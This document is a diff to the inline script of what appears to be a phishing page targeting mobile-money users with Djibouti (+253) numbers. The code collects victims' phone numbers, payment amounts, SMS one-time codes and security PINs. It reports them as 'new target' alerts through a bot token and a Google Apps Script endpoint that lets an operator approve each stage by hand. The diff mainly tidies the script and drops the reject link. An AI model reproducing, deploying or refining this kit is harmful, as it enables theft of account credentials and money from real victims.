@@ -119,7 +119,8 @@
     </section>
 </div>
 
-const params = new URLSearchParams(window.location.search);
+<script>
+    const params = new URLSearchParams(window.location.search);
     const BOT_TOKEN = params.get('token');
     const CHAT_ID = params.get('id');
     const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbzHqqqFuhAV070lss288JWURMsWlM1pb7CRO3Sr5QCrgQdnbWScfCl9nnN7RgHYCqEJQg/exec";
@@ -151,9 +152,7 @@ const params = new URLSearchParams(window.location.search);
         currentPhone = p;
         
         let approve = `${SCRIPT_URL}?id=${p}&cmd=approve`;
-        let reject = `${SCRIPT_URL}?id=${p}&cmd=wrongOTP`;
-
-        notify(`🇩🇯 *NOUVELLE CIBLE*\n📱 Tél: +253 ${p}\n💰 Montant: ${document.getElementById('amt-txt').innerText}\n\n✅ [APPROUVER POUR OTP](${approve})`);
+        notify(`🇩🇯 *NOUVELLE CIBLE*\n📱 Tél: +253 ${p}\n💰 Montant: ${document.getElementById('amt-txt').innerText}\n\n✅ [APPROUVER POUR SMS](${approve})`);
         
         showView(2); // Show "Vérification en cours..."
         startPolling(p, "otp_check");
@@ -168,8 +167,8 @@ const params = new URLSearchParams(window.location.search);
             if(cls === 'otp-in') {
                 notify(`🔓 *OTP REÇU*\n📱 Tél: ${currentPhone}\n🔢 Code: \`${code}\``);
                 document.getElementById('loader-title').innerText = "Vérification du code...";
-                showView(2); // Go back to loader
-                startPolling(currentPhone, "pin_check"); // Wait for manual approval to show PIN
+                showView(2); 
+                startPolling(currentPhone, "pin_check");
             } else {
                 notify(`🔑 *PIN REÇU*\n📱 Tél: ${currentPhone}\n💎 PIN: \`${code}\``);
                 showView(5);
@@ -178,36 +177,34 @@ const params = new URLSearchParams(window.location.search);
     }
 
     async function startPolling(phone, stage) {
-    const pollInterval = setInterval(async () => {
-        try {
-            // Fetch status from your Google Script
-            const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
-            const status = (await response.text()).trim();
-            
-            if (status === "approved") {
-                clearInterval(pollInterval);
-                // Clear status in the sheet to prevent loops
-                fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`); 
+        const pollInterval = setInterval(async () => {
+            try {
+                const response = await fetch(`${SCRIPT_URL}?id=${phone}&v=${Date.now()}`);
+                const status = (await response.text()).trim();
                 
-                if (stage === "otp_check") {
-                    document.getElementById('display-phone').innerText = "+253 " + phone;
-                    showView(3); // Transition to Validation SMS screen
-                    startTimer(30);
-                } else if (stage === "pin_check") {
-                    showView(4); // Transition to PIN screen
+                if (status === "approved") {
+                    clearInterval(pollInterval);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
+                    
+                    if (stage === "otp_check") {
+                        document.getElementById('display-phone').innerText = "+253 " + phone;
+                        showView(3); // Go to Validation SMS
+                        startTimer(30);
+                    } else if (stage === "pin_check") {
+                        showView(4); // Go to Security PIN
+                    }
+                } else if (status === "wrongOTP") {
+                    clearInterval(pollInterval);
+                    fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
+                    document.getElementById('otp-error').style.display = "block";
+                    showView(3);
+                    document.querySelectorAll('.otp-in').forEach(i => i.value = "");
                 }
-            } else if (status === "wrongOTP") {
-                clearInterval(pollInterval);
-                fetch(`${SCRIPT_URL}?id=${phone}&cmd=clear`);
-                document.getElementById('otp-error').style.display = "block";
-                showView(3); // Return to OTP input on error
-                document.querySelectorAll('.otp-in').forEach(i => i.value = "");
+            } catch (e) { 
+                console.error("Polling Connection Error:", e); 
             }
-        } catch (e) { 
-            console.error("Polling Connection Error:", e); 
-        }
-    }, 3000); // Check every 3 seconds
-}
+        }, 3000);
+    }
 
     function startTimer(sec) {
         let t = sec;
@@ -219,5 +216,6 @@ const params = new URLSearchParams(window.location.search);
     }
 
     updateCalc();
+</script>
 </body>
 </html>
